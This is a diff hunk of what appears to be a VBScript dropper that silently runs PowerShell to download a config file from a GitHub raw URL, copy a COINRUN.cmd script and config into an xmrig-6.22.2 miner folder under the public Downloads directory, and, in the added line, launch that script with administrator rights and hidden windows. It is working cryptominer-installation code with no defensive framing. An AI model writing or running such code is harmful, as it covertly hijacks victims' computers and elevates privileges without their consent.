@@ -11,4 +11,5 @@ objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubu
 objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/config.json -OutFile C:\Users\Public\Downloads\config.json", 0, True
 objShell.Run "powershell.exe -Command Copy-Item -Path C:\Users\Public\Downloads\COINRUN.cmd -Destination C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd -Force", 0, True
 objShell.Run "powershell.exe -Command Copy-Item -Path C:\Users\Public\Downloads\config.json -Destination C:\Users\Public\Downloads\xmrig-6.22.2\config.json -Force", 0, True
+objShell.Run "powershell.exe -Command Start-Process -FilePath 'C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd' -ArgumentList '/S' -Verb RunAs", 0, True
 objShell.Run "powershell.exe exit", 0, False
